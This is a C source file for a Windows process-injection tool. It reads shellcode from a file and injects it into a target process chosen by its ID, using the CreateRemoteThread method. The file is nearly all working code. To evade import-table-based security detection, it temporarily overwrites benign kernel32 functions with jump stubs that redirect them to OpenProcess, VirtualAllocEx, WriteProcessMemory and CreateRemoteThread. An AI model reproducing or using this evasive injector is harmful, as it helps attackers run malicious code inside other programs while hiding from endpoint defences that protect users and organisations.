//Redefining alternate functions to stomp in order to bypass IAT detection.
//This is just the standard CreateRemoteThread process injection method.
//
//The only thing I had to watch for was making sure that the function I'm going to stomp 
//had a matching return type as the actual function I'm having it jump to.

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

BOOL Stomp(PSTR Module, PSTR Func, PSTR jmpModule, PSTR jmpFunc, 
	PVOID* pfnStomp, PBYTE* pbOriginalBytes, PINT cbOriginal);

BOOL Fix(PVOID* pfnStomped, PBYTE* pbOriginal, INT cbOriginal);

//OpenProcess
HANDLE WINAPI CreateFileA(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

//VirtualAllocEx
LPVOID WINAPI OpenFileById(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType,
	DWORD flProtect);

//WriteProcessMemory
BOOL WINAPI WriteFile(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize,
	SIZE_T* lpNumberOfBytesWritten);

//CreateRemoteThread
HANDLE WINAPI ReOpenFile( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, 
	LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,DWORD dwCreationFlags, LPDWORD lpThreadId);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	PVOID pfnOriginal = NULL;
	PBYTE pbOriginal = NULL;
	INT cbOriginal = 0;

	DWORD dwPID = 0;
	HANDLE hProcess = NULL;
	PVOID hAlloc = NULL;
	HANDLE hThread = NULL;

	if (argc != 3)
	{
		printf("Usage: Redefinject.exe <PID> C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	dwPID = wcstoul(argv[1], NULL, 0);

	//Read shellcode and setup
	Ret = ReadContents(argv[2], &Shellcode, &SCLen);
	if (!Ret)
	{
		printf("[ReadContents] Failed to read shellcode file.\n");
		goto CLEANUP;
	}

	//OpenProcess
	Ret = Stomp("kernel32.dll", "CreateFileA", "kernel32.dll", "OpenProcess", &pfnOriginal, &pbOriginal, &cbOriginal);
	if (!Ret)
	{
		printf("[Stomp] Failed to stomp CreateFileA for OpenProcess.\n");
		goto CLEANUP;
	}

	hProcess = CreateFileA(PROCESS_ALL_ACCESS, FALSE, dwPID);

	if (hProcess == NULL)
		goto CLEANUP;

	Ret = Fix(&pfnOriginal, &pbOriginal, cbOriginal);
	if (!Ret)
	{
		printf("[Fix] Failed to fix CreateFileA.\n");
		goto CLEANUP;
	}

	//VirtualAllocEx
	Ret = Stomp("kernel32.dll", "OpenFileById", "kernel32.dll", "VirtualAllocEx", &pfnOriginal, &pbOriginal, &cbOriginal);
	if (!Ret)
	{
		printf("[Stomp] Failed to stomp OpenFileById for VirtualAllocEx.\n");
		goto CLEANUP;
	}

	hAlloc = OpenFileById(hProcess, NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	Ret = Fix(&pfnOriginal, &pbOriginal, cbOriginal);
	if (!Ret)
	{
		printf("[Fix] Failed to fix OpenFileById.\n");
		goto CLEANUP;
	}

	//WriteProcessMemory
	Ret = Stomp("kernel32.dll", "WriteFile", "kernel32.dll", "WriteProcessMemory", &pfnOriginal, &pbOriginal, &cbOriginal);
	if (!Ret)
	{
		printf("[Stomp] Failed to stomp WriteFile for WriteProcessMemory.\n");
		goto CLEANUP;
	}

	Ret = WriteFile(hProcess, hAlloc, Shellcode, SCLen, NULL);

	Ret = Fix(&pfnOriginal, &pbOriginal, cbOriginal);
	if (!Ret)
	{
		printf("[Fix] Failed to fix WriteFile.\n");
		goto CLEANUP;
	}

	//CreateRemoteThread
	Ret = Stomp("kernel32.dll", "ReOpenFile", "kernel32.dll", "CreateRemoteThread", &pfnOriginal, &pbOriginal, &cbOriginal);
	if (!Ret)
	{
		printf("[Stomp] Failed to stomp ReOpenFile for CreateRemoteThread.\n");
		goto CLEANUP;
	}

	hThread = ReOpenFile(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, NULL);
	
	Ret = Fix(&pfnOriginal, &pbOriginal, cbOriginal);
	if (!Ret)
	{
		printf("[Fix] Failed to fix ReOpenFile.\n");
		goto CLEANUP;
	}
	
CLEANUP:
	if (Shellcode != NULL)
		free(Shellcode);

	if (hProcess != NULL)
		CloseHandle(hProcess);

	if (hThread != NULL)
		CloseHandle(hThread);

	return 0;
}

BOOL Stomp(PSTR Module, PSTR Func, PSTR jmpModule, PSTR jmpFunc, PVOID * pfnStomp, PBYTE * pbOriginalBytes, PINT cbOriginal)
{
	BOOL Ret = TRUE;
	size_t i = 0;
	DWORD dwOldProtect = 0;

	*pfnStomp = GetProcAddress(LoadLibraryA(Module), Func);
	FARPROC pfnJump = GetProcAddress(LoadLibraryA(jmpModule), jmpFunc);

	BYTE mov_rax[] = { 0x48, 0xb8 };
	BYTE jmp_rax[] = { 0xff, 0xe0 };

	PBYTE pbMerged = (PBYTE)malloc(sizeof(mov_rax) + sizeof(&pfnJump) + sizeof(jmp_rax));

	if (pbMerged == NULL)
	{
		Ret = FALSE;
		goto CLEANUP;
	}

	memcpy(pbMerged + i, mov_rax, sizeof(mov_rax));
	i += sizeof(mov_rax);
	memcpy(pbMerged + i, &pfnJump, sizeof(&pfnJump));
	i += sizeof(&pfnJump);
	memcpy(pbMerged + i, jmp_rax, sizeof(jmp_rax));
	i += sizeof(jmp_rax);

	Ret = VirtualProtect(*pfnStomp, i, PAGE_READWRITE, &dwOldProtect);
	if (!Ret)
		goto CLEANUP;

	*pbOriginalBytes = calloc(1, i);
	memcpy(*pbOriginalBytes, *pfnStomp, i);
	*cbOriginal = i;

	memcpy(*pfnStomp, pbMerged, i);

	Ret = VirtualProtect(*pfnStomp, i, dwOldProtect, &dwOldProtect);
	if (!Ret)
		goto CLEANUP;

CLEANUP:
	if (pbMerged)
		free(pbMerged);

	return Ret;
}

BOOL Fix(PVOID * pfnStomped, PBYTE *pbOriginal, INT cbOriginal)
{
	BOOL Ret = TRUE;
	DWORD dwOldProtect = 0;

	Ret = VirtualProtect(*pfnStomped, cbOriginal, PAGE_READWRITE, &dwOldProtect);
	if (!Ret)
		goto CLEANUP;

	memcpy(*pfnStomped, *pbOriginal, cbOriginal);
	Ret = VirtualProtect(*pfnStomped, cbOriginal, dwOldProtect, &dwOldProtect);
	if (!Ret)
		goto CLEANUP; // going there anyways i guess.

CLEANUP:
	*pfnStomped = NULL;
	
	if (*pbOriginal != NULL)
		free(*pbOriginal);

	return Ret;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}